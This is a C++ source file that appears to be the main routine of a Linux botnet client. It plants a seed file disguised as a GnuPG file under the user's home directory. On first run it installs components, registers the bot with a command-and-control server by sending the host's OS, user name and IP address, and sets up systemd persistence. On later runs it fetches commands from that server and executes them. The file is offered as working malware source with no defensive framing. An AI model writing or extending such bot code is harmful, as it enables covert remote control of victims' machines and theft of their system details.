#include <iostream>
#include <fstream>
#include <string>

#include "cpp-linux.hh"
#include "c2/c2.hh"
#include "components/install.hh"

const std::string SEED_DIR = ".gnupg/.seeds";
const std::string SEED_FILE = ".seed_gnupg~";


int main()
{
    std::string homeDir, seedPath;

    homeDir = std::getenv("HOME");
    seedPath = homeDir + "/" + SEED_DIR + "/" + SEED_FILE;

    seed::Seed botSeed(seedPath);

    if ( botSeed.exists() ) {
        std::string hashSum, ipAddr, postForm, cmd;

        botSeed.getSeed();

        hashSum = botSeed.getHash();
        ipAddr = getIPAddr();

        postForm = c2::getCmdParams(hashSum, ipAddr);
        cmd = c2::getCmd(postForm);
        c2::runCmd(cmd);

    } else {
        install::installFiles();

        std::string hashSum, os, user, ipAddr, postForm;

        botSeed.initSeed();

        hashSum = botSeed.getHash();
        os = getOS();
        user = getUser();
        ipAddr = getIPAddr();

        postForm = c2::getRegParams(hashSum, os, user, ipAddr);
        c2::registerBot(postForm);

        install::initSystemd();
    }

    return 0;
}
